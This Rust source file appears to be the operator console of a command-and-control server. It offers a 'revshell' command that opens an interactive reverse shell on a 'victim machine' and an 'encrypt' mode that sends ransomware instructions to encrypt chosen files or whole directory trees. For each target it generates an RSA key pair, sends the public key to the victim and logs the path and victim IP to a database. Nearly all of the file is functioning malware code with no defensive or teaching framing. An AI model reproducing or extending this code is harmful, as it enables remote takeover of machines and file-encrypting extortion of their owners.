//functions for active interactions with the host of the c2, like interacting with a rever shell or choosing what files to encrypt
use std::{collections::HashMap, str::from_utf8, sync::Arc, time::Duration};

use aes_gcm::aead::OsRng;
use encryption::insert_file;
use rsa::{traits::PublicKeyParts, RsaPrivateKey, RsaPublicKey};
use shared::{encrypted_write_from_key, ControlCode, ControlPacket, DataPacket, ModuleType};
use tokio::{io::{self, AsyncReadExt, AsyncWriteExt}, net::tcp::OwnedWriteHalf, sync::{mpsc::{self, Receiver}, Mutex}, time::{self, sleep}};
use tokio_util::sync::CancellationToken;

use crate::{Connection, ERROR, SRV_CMDS_GAP};

const CONN_CMDS: [(&str, &str); 4] = [("revshell", "spawn an interactable shell on the victim machine"),
                                      ("encrypt", "enter encrypt mode to encrypt passed files/directories on the victim file system"),
                                      ("help", "shows this help message"),
                                      ("exit", "exit interacting with connection, does not terminate the connection")];
pub mod encryption;

pub async fn connection_handler(connection: &Connection) -> std::io::Result<()> {

    let prefix: &str = &format!("C2 [{}] $ ", connection.writer.lock().await.as_ref().peer_addr().unwrap());
    let mut stdout = io::stdout();

    loop {
        let mut input = [0; 1024];
        stdout.write(prefix.as_bytes()).await?;
        stdout.flush().await?;
        let n = io::stdin().read(&mut input).await?;
        
        match &input[..n] {
            b"revshell\r\n" => {
                if connection.modules_map.contains_key(&ModuleType::ReverseShell) {
                    let data = ControlPacket {
                        module_type: ModuleType::ReverseShell,
                        control_code: ControlCode::Start
                    };
                    let (sx, rx) = mpsc::channel(64);
                    *connection.modules_map.get(&ModuleType::ReverseShell).unwrap().lock().await = sx;
                    encrypted_write_from_key(connection.writer.clone(), &connection.key, data).await?;
                    reverse_shell_handler(rx, connection.writer.clone(), &connection.key).await?;
                } else {
                    io::stdout().write_all(b"ReverseShell Module is not present for this connection").await?;
                }
            }

            b"encrypt\r\n" => {
                if connection.modules_map.contains_key(&ModuleType::RansomWare) {
                    let (sx, rx) = mpsc::channel(64);
                    *connection.modules_map.get(&ModuleType::RansomWare).unwrap().lock().await = sx;         
                    encryption_handler(rx, connection.writer.clone(), &connection.key).await?;
                } else {
                    io::stdout().write_all(b"RansomWare Module not present").await?;
                }
            }

            b"help\r\n" => {
                stdout.write(b"CONNECTION COMMANDS:\n\n").await?;
                for (command, info) in CONN_CMDS {
                    stdout.write(format!("    {}{}{}\n\n", command, " ".repeat(SRV_CMDS_GAP - command.len()), info).as_bytes()).await?;
                }
                stdout.write(b"\n").await?;
                stdout.flush().await?;
            }

            b"exit\r\n" => {
                return Ok(())
            }

            _ => ()
        }

    }
} 

pub async fn reverse_shell_handler(mut rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {
    let token = CancellationToken::new();
    let token2 = token.clone();

    //STDOUT + STDERR
    let reader_handle = tokio::spawn(async move {
        loop {
            tokio::select! {
                Some(data) = rx.recv() => {
                    io::stderr().write(&data).await?;
                    io::stderr().flush().await?;
                }
                _ = token.cancelled() => {
                    break
                }
            }
        }
        Ok::<(), std::io::Error>(())
    });

    //STDIN
    loop {
        let mut buf = [0; 1024];
        let n = io::stdin().read(&mut buf).await?;
        let data = DataPacket {
            module_type: ModuleType::ReverseShell,
            data: buf[..n].to_vec()
        };
        encrypted_write_from_key(writer.clone(), key, data).await?;
        if &buf[..n] == "exit\r\n".as_bytes() {
            sleep(Duration::from_millis(50)).await;
            eprint!("\x1B[2J\x1B[1;1H");
            eprint!("Terminal Closed...");
            eprint!("\n");
            token2.cancel();
            io::stderr().flush().await?;
            sleep(Duration::from_millis(50)).await;
            break
        }
    }
    reader_handle.await??;
    Ok(())
}

pub async fn encryption_handler(mut rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {

    let prefix: &str = &format!("C2 [{}] [encrypt] $ ", writer.lock().await.as_ref().peer_addr().unwrap());
    let mut stdout = io::stdout();
    let mut stderr = io::stderr();
    //-f = 0, -d = 1, -rd = 2, in the first byte when sending
    stdout.write(b"now in ENCRYPT mode, write to stdin one of the available commands:\n 
    -f <FILEPATH> for file(s), \n 
    -d <DIRECTORY> to encrypt the contents of a directory\n
    -rd <DIRECTORY> to recursively encrypt the contents of a directory\n
    -exit to leave ENCRYPT mode\n\n").await?;
    stdout.flush().await?;
    loop {
        let mut buf = [0; 1024];
        stdout.write(prefix.as_bytes()).await?;
        stdout.flush().await?;
        let n = io::stdin().read(&mut buf).await?;
        let input = from_utf8(&buf[..n-2]);
        if input.is_err() {
            stderr.write_all(format!("{}{}", ERROR, "unable to read supplied input").as_bytes()).await?;
        }
        let parts: Vec<&str> = input.unwrap().split(" ").into_iter().collect();
        if parts.len() == 0 {
            continue
        }
        let map = HashMap::from([("-f", 0u8), ("-d", 1u8), ("-rd", 2u8)]);
        match parts[0] {
            "-exit" => break,
            default => {
                //send file/dir path with the type of encryption to perform
                if let Some(id) = map.get(default) {
                    let data = DataPacket {
                        module_type: ModuleType::RansomWare,
                        data: [&[*id], parts[1].as_bytes()].concat(),
                    };
                    encrypted_write_from_key(writer.clone(), key, data).await?;
                    // either wait for request to recieve an RSA key, or an exit request
                    let data = time::timeout(Duration::from_secs(2), rx.recv()).await;
                    if data.is_err() { continue }
                    if data.unwrap().is_none() { continue }
                    //send rsa key
                    let priv_rsa_key = RsaPrivateKey::new(&mut OsRng, 2048).map_err(|_| std::io::Error::from(std::io::ErrorKind::InvalidData))?;
                    let rsa_pub_key = RsaPublicKey::from(&priv_rsa_key);
                    println!("{} {}", rsa_pub_key.n().to_bytes_le().len(), rsa_pub_key.e().to_bytes_le().len());
                    let part_n = [vec![rsa_pub_key.n().to_bytes_le().len() as u8], rsa_pub_key.n().to_bytes_le()].concat();
                    let part_e = [vec![rsa_pub_key.e().to_bytes_le().len() as u8], rsa_pub_key.e().to_bytes_le()].concat();
                    let nums: Vec<u8> = [part_n, part_e].concat();
                    println!("{:?}", nums);
                    let data = DataPacket {
                        module_type: ModuleType::RansomWare,
                        data: nums.clone(),
                    };
                    encrypted_write_from_key(writer.clone(), key, data).await?;
                    

                    // if sent RSA key, wait for success message, if none if 5 seconds then process probably failed
                    let data = time::timeout(Duration::from_secs(2), rx.recv()).await;
                    if data.is_err() { println!("Encrypt Timed out, unsuccesful"); continue }
                    if data.unwrap().is_none() { println!("encryption: channel closed"); continue }
                    // if recieved success then save priv rsa in db with the path and ip
                    match insert_file(parts[1], &writer.lock().await.peer_addr().unwrap().to_string(), nums) {
                        Ok(ok) => if !ok {println!("error saving to db")}
                        Err(e) => println!("error savign to db: {}", e)
                    }
                    println!("success");

                }
            }
        }

    }
    Ok(())
}



